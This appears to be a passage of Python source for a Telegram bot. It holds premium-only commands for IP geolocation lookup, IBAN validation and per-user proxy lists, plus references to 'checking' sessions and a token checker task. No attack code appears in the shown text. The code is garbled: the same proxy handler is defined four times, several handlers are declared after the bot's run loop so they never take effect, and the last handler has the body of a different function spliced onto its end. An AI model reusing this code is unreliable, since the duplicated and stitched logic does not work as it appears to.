        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ IP Aᴅᴅʀᴇss!"), parse_mode='html')
        return
    
    ip_address = ip_match.group(0)
    
    status_msg = await event.reply(premium_emoji(f"🔄 Lᴏᴏᴋɪɴɢ ᴜᴘ <code>{ip_address}</code>..."), parse_mode='html')
    
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        session = await get_http_session()
        async with session.get(f"https://ipinfo.io/{ip_address}/json") as resp:
                if resp.status != 200:
                    await status_msg.edit(premium_emoji(f"❌ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴏᴋ ᴜᴘ <code>{ip_address}</code>"), parse_mode='html')
                    return
                
                data = await resp.json()
                
                if not data or 'ip' not in data:
                    await status_msg.edit(premium_emoji(f"❌ IP Dᴀᴛᴀ ᴡᴀsɴ'ᴛ Fᴏᴜɴᴅ!"), parse_mode='html')
                    return
                
                ip = data.get('ip', 'N/A')
                hostname = data.get('hostname', 'N/A')
                city = data.get('city', 'N/A')
                region = data.get('region', 'N/A')
                country_code = data.get('country', 'N/A')
                loc = data.get('loc', 'N/A')
                org = data.get('org', 'N/A')
                postal = data.get('postal', 'N/A')
                timezone = data.get('timezone', 'N/A')
                anycast = data.get('anycast', False)
                
                loc_parts = loc.split(',') if loc != 'N/A' else ['N/A', 'N/A']
                lat = loc_parts[0] if len(loc_parts) > 0 else 'N/A'
                lon = loc_parts[1] if len(loc_parts) > 1 else 'N/A'
                
                country_name = country_code
                try:
                    async with session.get(f"https://restcountries.com/v3.1/alpha/{country_code}") as resp2:
                        if resp2.status == 200:
                            country_data = await resp2.json()
                            country_name = country_data[0].get('name', {}).get('common', country_code)
                except:
                    pass
                
                asn = org.split(' ')[0] if org != 'N/A' and org.startswith('AS') else org
                
                flag = get_flag(country_code)
                
                result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
     IP Lᴏᴏᴋᴜᴘ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>IP</b> ↯ <code>{ip}</code>
💡 <b>Hᴏsᴛɴᴀᴍᴇ</b> ↯ <code>{hostname}</code>
💡 <b>ASN</b> ↯ <code>{asn}</code>
💡 <b>Oʀɢᴀɴɪᴢᴀᴛɪᴏɴ</b> ↯ <code>{org}</code>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>Cɪᴛʏ</b> ↯ <code>{city}</code>
💡 <b>Sᴛᴀᴛᴇ</b> ↯ <code>{region}</code>
💡 <b>Pᴏsᴛᴀʟ Cᴏᴅᴇ</b> ↯ <code>{postal}</code>
💡 <b>Cᴏᴜɴᴛʀʏ</b> ↯ <code>{country_name}</code> {flag}
📍 <b>Cᴏᴏʀᴅɪɴᴀᴛᴇs</b> ↯ <code>{lat}, {lon}</code>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
⏱️ <b>Tɪᴍᴇᴢᴏɴᴇ</b> ↯ <code>{timezone}</code>
🔄 <b>Aɴʏᴄᴀsᴛ</b> ↯ {'✅ Yᴇs' if anycast else '❌ Nᴏ'}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 Mᴀᴅᴇ ʙʏ @znzii"""
                
                await status_msg.edit(premium_emoji(result), parse_mode='html')
                
    except asyncio.TimeoutError:
        await status_msg.edit(premium_emoji(f"❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ ʟᴏᴏᴋɪɴɢ ᴜᴘ <code>{ip_address}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
        
@bot.on(events.NewMessage(pattern='/iban'))
async def iban_lookup(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    data = event.raw_text[6:].strip()
    
    if not data:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/iban &lt;IBAN&gt;</code>

Exᴀᴍᴘʟᴇs:
<code>/iban GB82WEST12345698765432</code>
<code>/iban DE89370400440532013000</code>
"""), parse_mode='html')
        return
    
    iban_pattern = r'([A-Z]{2}[ ]?[0-9]{2})(?=(?:[ ]?[A-Z0-9]){9,30}$)((?:[ ]?[A-Z0-9]{3,5}){2,7})([ ]?[A-Z0-9]{1,3})?'
    iban_match = re.search(iban_pattern, data)
    
    if not iban_match:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ IBAN!"), parse_mode='html')
        return
    
    iban = iban_match.group(0).replace(' ', '')
    
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{iban}</code>..."), parse_mode='html')
    
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        session = await get_http_session()
        async with session.get(f"https://openiban.com/validate/{iban}?getBIC=true&validateBankCode=true") as resp:
                if resp.status != 200:
                    await status_msg.edit(premium_emoji("❌ Gᴇɴᴇʀᴀʟ Sᴇʀᴠᴇʀ Eʀʀᴏʀ!"), parse_mode='html')
                    return
                
                data = await resp.json()
                
                if not data.get('valid'):
                    messages = data.get('messages', [])
                    error_msg = ', '.join(messages) if messages else "Tʜɪs IBAN ɪsɴ'ᴛ Vᴀʟɪᴅ"
                    await status_msg.edit(premium_emoji(f"❌ {error_msg}!"), parse_mode='html')
                    return
                
                bank_data = data.get('bankData', {})
                
                bank_name = bank_data.get('name', 'N/A')
                bank_code = bank_data.get('bankCode', 'N/A')
                bic = bank_data.get('bic', 'N/A')
                messages = ', '.join(data.get('messages', ['Valid IBAN']))
                
                result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
    IBAN Lᴏᴏᴋᴜᴘ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 <b>IBAN</b> ↯ <code>{iban}</code>
💡 <b>Mᴇssᴀɢᴇs</b> ↯ <i>{messages}</i>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🏦 <b>Bᴀɴᴋ</b> ↯ <i>{bank_name}</i>
🔢 <b>Bᴀɴᴋ Cᴏᴅᴇ</b> ↯ <i>{bank_code}</i>
🔑 <b>BIC</b> ↯ <i>{bic}</i>
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼"""
                
                await status_msg.edit(premium_emoji(result), parse_mode='html')
                
    except asyncio.TimeoutError:
        await status_msg.edit(premium_emoji("❌ Tɪᴍᴇᴏᴜᴛ ᴡʜɪʟᴇ ᴄʜᴇᴄᴋɪɴɢ IBAN"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(" Sᴛᴏᴘᴘᴇᴅ", alert=True)
        try:
            await event.edit(premium_emoji("🛑 Cʜᴇᴄᴋɪɴɢ sᴛᴏᴘᴘᴇᴅ ʙʏ ᴜsᴇʀ."), parse_mode='html')
        except:
            pass

print("✅ Bᴏᴛ sᴛᴀʀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!")

async def add_my_proxy(event):
    try:
        user_id = event.sender_id
        if not is_premium(user_id):
            await event.reply(premium_emoji("❌  Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
            return
        text = event.message.text.strip()
        lines_in_msg = text.split('\n')
        new_proxies = []
        first = lines_in_msg[0].split(' ', 1)
        if len(first) > 1 and first[1].strip():
            new_proxies.append(first[1].strip())
        for l in lines_in_msg[1:]:
            if l.strip():
                new_proxies.append(l.strip())
        if not new_proxies:
            await event.reply(premium_emoji("❌  Usage:\n/addmyproxy ip:port:user:pass\nOR\n/addmyproxy\nip:port:user:pass"), parse_mode='html')
            return
        current = get_user_proxies(user_id)
        added = [p for p in new_proxies if p not in current]
        if added:
            save_user_proxies(user_id, current + added)
            await event.reply(premium_emoji(f"✅  Added {len(added)} proxies!\nTotal: {len(current)+len(added)}"), parse_mode='html')
        else:
            await event.reply(premium_emoji("⚠️  All proxies already exist!"), parse_mode='html')
    except Exception as e:
        import traceback
        print(f'[ERROR add_my_proxy] {e}')
        traceback.print_exc()
        try:
            await event.reply(premium_emoji(f"❌  Error: {str(e)}"), parse_mode='html')
        except:
            pass



async def add_my_proxy(event):
    try:
        user_id = event.sender_id
        if not is_premium(user_id):
            await event.reply(premium_emoji("❌  Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
            return
        text = event.message.text.strip()
        lines_in_msg = text.split('\n')
        new_proxies = []
        first = lines_in_msg[0].split(' ', 1)
        if len(first) > 1 and first[1].strip():
            new_proxies.append(first[1].strip())
        for l in lines_in_msg[1:]:
            if l.strip():
                new_proxies.append(l.strip())
        if not new_proxies:
            await event.reply(premium_emoji("❌  Usage:\n/addmyproxy ip:port:user:pass\nOR\n/addmyproxy\nip:port:user:pass"), parse_mode='html')
            return
        current = get_user_proxies(user_id)
        added = [p for p in new_proxies if p not in current]
        if added:
            save_user_proxies(user_id, current + added)
            await event.reply(premium_emoji(f"✅  Added {len(added)} proxies!\nTotal: {len(current)+len(added)}"), parse_mode='html')
        else:
            await event.reply(premium_emoji("⚠️  All proxies already exist!"), parse_mode='html')
    except Exception as e:
        import traceback
        print(f'[ERROR add_my_proxy] {e}')
        traceback.print_exc()
        try:
            await event.reply(premium_emoji(f"❌  Error: {str(e)}"), parse_mode='html')
        except:
            pass



@bot.on(events.NewMessage(pattern=r'/addmyproxy'))
async def add_my_proxy(event):
    try:
        user_id = event.sender_id
        if not is_premium(user_id):
            await event.reply(premium_emoji("❌  Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
            return
        text = event.message.text.strip()
        lines_in_msg = text.split('\n')
        new_proxies = []
        first = lines_in_msg[0].split(' ', 1)
        if len(first) > 1 and first[1].strip():
            new_proxies.append(first[1].strip())
        for l in lines_in_msg[1:]:
            if l.strip():
                new_proxies.append(l.strip())
        if not new_proxies:
            await event.reply(premium_emoji("❌  Usage:\n/addmyproxy ip:port:user:pass\nOR\n/addmyproxy\nip:port:user:pass"), parse_mode='html')
            return
        current = get_user_proxies(user_id)
        added = [p for p in new_proxies if p not in current]
        if added:
            save_user_proxies(user_id, current + added)
            await event.reply(premium_emoji(f"✅  Added {len(added)} proxies!\nTotal: {len(current)+len(added)}"), parse_mode='html')
        else:
            await event.reply(premium_emoji("⚠️  All proxies already exist!"), parse_mode='html')
    except Exception as e:
        import traceback
        print(f'[ERROR] {e}')
        traceback.print_exc()
        try:
            await event.reply(premium_emoji(f"❌  Error: {str(e)}"), parse_mode='html')
        except:
            pass




import json, os

USERS_FILE = '/root/bot_users.json'

def load_all_users():
    if not os.path.exists(USERS_FILE):
        return set()
    try:
        with open(USERS_FILE, 'r') as f:
            return set(json.load(f))
    except:
        return set()

def save_user_to_broadcast(user_id):
    users = load_all_users()
    users.add(user_id)
    with open(USERS_FILE, 'w') as f:
        json.dump(list(users), f)

def get_all_users():
    return load_all_users()



# ========== SMART DELAY SYSTEM ==========
_original_send = bot.send_message
_original_edit = bot.edit_message
_send_times = {}
_edit_times = {}

async def _safe_send(*args, **kwargs):
    import time
    now = time.time()
    last = _send_times.get('last', 0)
    wait = 0.5 - (now - last)
    if wait > 0:
        await asyncio.sleep(wait)
    _send_times['last'] = time.time()
    return await _original_send(*args, **kwargs)

async def _safe_edit(*args, **kwargs):
    import time
    now = time.time()
    last = _edit_times.get('last', 0)
    wait = 5.0 - (now - last)
    if wait > 0:
        await asyncio.sleep(wait)
    _edit_times['last'] = time.time()
    return await _original_edit(*args, **kwargs)

bot.send_message = _safe_send
bot.edit_message = _safe_edit

bot.loop.create_task(token_checker_task())
bot.loop.create_task(premium_checker_task())
bot.loop.create_task(daily_stars_task())
bot.run_until_disconnected()

async def add_my_proxy(event):
    try:
        user_id = event.sender_id
        if not is_premium(user_id):
            await event.reply(premium_emoji("❌  Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
            return

        text = event.message.text.strip()
        lines_in_msg = text.split('\n')
        new_proxies = []

        # Same line: /addmyproxy ip:port:user:pass
        first = lines_in_msg[0].split(' ', 1)
        if len(first) > 1 and first[1].strip():
            new_proxies.append(first[1].strip())

        # New lines
        for l in lines_in_msg[1:]:
            if l.strip():
                new_proxies.append(l.strip())

        if not new_proxies:
            await event.reply(premium_emoji("❌  Usage:\n/addmyproxy ip:port:user:pass\nOR\n/addmyproxy\nip:port:user:pass"), parse_mode='html')
            return

        current = get_user_proxies(user_id)
        added = [p for p in new_proxies if p not in current]

        if added:
            save_user_proxies(user_id, current + added)
            await event.reply(premium_emoji(f"✅  Added {len(added)} proxies!\nTotal: {len(current)+len(added)}"), parse_mode='html')
        else:
            await event.reply(premium_emoji("⚠️  All proxies already exist!"), parse_mode='html')

    except Exception as e:
        import traceback
        print(f'[ERROR add_my_proxy] {e}')
        traceback.print_exc()
        try:
            await event.reply(premium_emoji(f"❌  Error: {str(e)}"), parse_mode='html')
        except:
            pass
    user_id = event.sender_id
    proxies = get_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌  No proxies! Use /addmyproxy"), parse_mode='html')
        return
    await event.reply(premium_emoji(f"✅  Your proxies: {len(proxies)}\n\n" + "\n".join(proxies[:10])), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/clearproxy'))
async def clear_my_proxy(event):
    user_id = event.sender_id
    save_user_proxies(user_id, [])
    await event.reply(premium_emoji("✅  All your proxies cleared!"), parse_mode='html')

